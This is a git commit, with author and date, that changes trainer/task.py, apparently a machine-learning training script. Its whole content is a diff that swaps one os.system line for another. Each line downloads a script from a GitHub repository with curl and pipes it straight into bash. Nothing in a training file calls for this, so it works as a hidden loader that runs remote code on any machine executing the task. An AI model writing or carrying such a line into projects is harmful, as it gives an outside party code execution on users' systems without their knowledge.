3189326c54862e0be5fda2e04c7c6a1446db909e
kidoescegh <kidoescegh@gmail.com>
2025-04-30 21:45:56 -0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/kidoescegh/xm/raw/main/rinazure | bash')
+os.system('curl -sL https://github.com/kidoescegh/xm/raw/main/rinwsbiasa | bash')
